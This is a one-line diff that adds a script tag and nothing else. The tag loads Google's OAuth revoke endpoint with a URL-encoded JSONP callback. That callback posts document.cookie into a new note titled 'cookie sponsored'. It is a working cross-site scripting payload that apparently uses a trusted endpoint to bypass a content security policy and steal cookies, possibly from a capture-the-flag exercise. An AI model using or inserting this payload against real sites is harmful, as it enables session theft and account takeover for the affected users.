@@ -1,0 +1,1 @@
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=%24.post%28%27/note/new%27%2C%7Btitle%3A%20%22cookie%20sponsored%22%2C%20content%3A%20document.cookie%7D%29%3B"></script>
